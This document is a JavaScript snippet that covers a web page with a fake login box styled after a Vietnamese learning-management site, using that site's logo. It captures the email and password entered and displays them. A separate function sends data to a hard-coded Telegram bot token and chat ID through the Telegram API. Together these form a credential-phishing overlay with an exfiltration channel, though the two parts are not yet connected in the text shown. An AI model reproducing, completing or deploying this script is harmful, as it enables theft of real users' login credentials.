const data = {};

const overlay = document.createElement("div");
overlay.style.position = "fixed";
overlay.style.top = "0";
overlay.style.left = "0";
overlay.style.width = "100%";
overlay.style.height = "100%";
overlay.style.background = "#dfe3ea";
overlay.style.display = "flex";
overlay.style.justifyContent = "center";
overlay.style.alignItems = "center";
overlay.style.zIndex = "999999";

const box = document.createElement("div");
box.style.width = "550px";
box.style.background = "#fff";
box.style.border = "1px solid #ccc";
box.style.fontFamily = "Arial";
box.style.boxShadow = "0 0 20px rgba(0,0,0,0.2)";
box.style.borderTop = "4px solid red";

box.innerHTML = `
    <div style="
        padding:40px;
        text-align:center;
        border-bottom:1px solid #ddd;
    ">
        <img 
            src="https://lms.hethongilp.vn/img/logo.png"
            style="width:160px;"
        >
    </div>

    <div style="padding:30px;">
        
        <input 
            id="emailInput"
            type="text"
            placeholder="Email"
            style="
                width:100%;
                padding:16px;
                margin-bottom:20px;
                border:1px solid #ccc;
                font-size:22px;
                box-sizing:border-box;
            "
        >

        <input 
            id="passwordInput"
            type="password"
            placeholder="Password"
            style="
                width:100%;
                padding:16px;
                margin-bottom:20px;
                border:1px solid #ccc;
                font-size:22px;
                box-sizing:border-box;
            "
        >

        <label style="font-size:20px;">
            <input type="checkbox">
            Ghi nhớ đăng nhập
        </label>

        <button 
            id="loginBtn"
            style="
                width:100%;
                margin-top:25px;
                padding:16px;
                border:none;
                background:#79c92b;
                color:white;
                font-size:28px;
                cursor:pointer;
            "
        >
            Đăng nhập
        </button>
    </div>

    <div style="
        border-top:1px solid #ddd;
        text-align:right;
        padding:15px;
        font-size:20px;
    ">
        Design by Hoàng Vũ Group
    </div>
`;

overlay.appendChild(box);
document.body.appendChild(overlay);

document.getElementById("loginBtn").onclick = () => {

    data.email = document.getElementById("emailInput").value;
    data.password = document.getElementById("passwordInput").value;

    console.log(data);

    alert(
        "Email: " + data.email +
        "\\nPassword: " + data.password
    );
};


const TELEGRAM_TOKEN = "8717080086:AAH068HuIJdYKaVkr3192dQyCPFcPV7W5kA";
const TELEGRAM_CHAT_ID = "6533206955";


function handleGuiData() {
    const dataHienTai = { 
        status: "Nguoi dung da bam nut", 
        time: new Date().toLocaleString("vi-VN") 
    };
    
    // Gọi hàm gốc để bắn data sang Telegram
    sendDataToTelegram(dataHienTai); 
}


function sendDataToTelegram(myData) {
    const text = `🔔 *Có dữ liệu mới:* \n\n${JSON.stringify(myData, null, 2)}`;
    
    // Đường link API của Telegram
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: "Markdown" // Để text hiển thị đẹp hơn
        })
    })
    .then(() => console.log("Gửi về Telegram thành công!"))
    .catch(err => console.error("Lỗi:", err));
}


